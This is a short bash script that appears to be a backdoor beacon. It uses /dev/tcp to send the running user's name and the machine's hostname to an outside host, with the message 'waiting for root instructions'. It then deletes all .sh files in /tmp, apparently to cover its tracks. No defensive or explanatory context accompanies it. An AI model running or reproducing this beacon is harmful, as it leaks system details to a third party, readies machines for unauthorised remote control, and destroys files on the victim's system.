#!/usr/bin/env bash
host=boesen.science
down_port=2042
up_port=2043

printf "INFO: $(whoami)@$(hostname) waiting for root instructions." > /dev/tcp/$host/$up_port

rm /tmp/*.sh
